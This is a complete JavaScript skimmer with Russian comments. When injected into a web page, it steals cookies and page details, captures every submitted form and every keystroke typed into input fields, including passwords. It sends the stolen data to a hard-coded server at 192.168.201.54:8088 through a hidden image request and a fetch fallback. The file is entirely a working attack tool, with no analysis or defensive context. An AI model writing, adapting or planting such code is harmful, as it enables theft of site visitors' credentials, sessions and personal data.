(function() {
  // Функция для кражи куки
  function stealCookies() {
    var cookies = document.cookie;
    sendData('cookies', cookies);
  }
  
  // Функция для кражи данных форм
  function hookForms() {
    document.querySelectorAll('form').forEach(function(form) {
      form.addEventListener('submit', function(e) {
        var formData = new FormData(form);
        var data = {};
        
        for (var pair of formData.entries()) {
          data[pair[0]] = pair[1];
        }
        
        sendData('form', JSON.stringify(data));
      });
    });
  }
  
  // Функция для отправки данных на ваш сервер
  function sendData(type, data) {
    // Создаем невидимое изображение для отправки данных
    var img = new Image();
    img.src = 'http://192.168.201.54:8088/stolen?' + type + '=' + encodeURIComponent(data);
    img.style.display = 'none';
    document.body.appendChild(img);
    
    // Альтернативный метод с использованием fetch
    try {
      fetch('http://192.168.201.54:8088/stolen', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({
          type: type,
          data: data
        })
      });
    } catch (e) {
      // Игнорируем ошибки
    }
  }
  
  // Кража информации о странице
  function stealPageInfo() {
    var pageInfo = {
      url: window.location.href,
      title: document.title,
      referrer: document.referrer
    };
    sendData('page', JSON.stringify(pageInfo));
  }
  
  // Запускаем все функции
  stealCookies();
  hookForms();
  stealPageInfo();
  
  // Добавляем слушатель для кражи вводимых данных
  document.addEventListener('input', function(e) {
    if (e.target.tagName === 'INPUT') {
      var inputData = {
        id: e.target.id,
        name: e.target.name,
        value: e.target.value,
        type: e.target.type
      };
      sendData('input', JSON.stringify(inputData));
    }
  });
})();
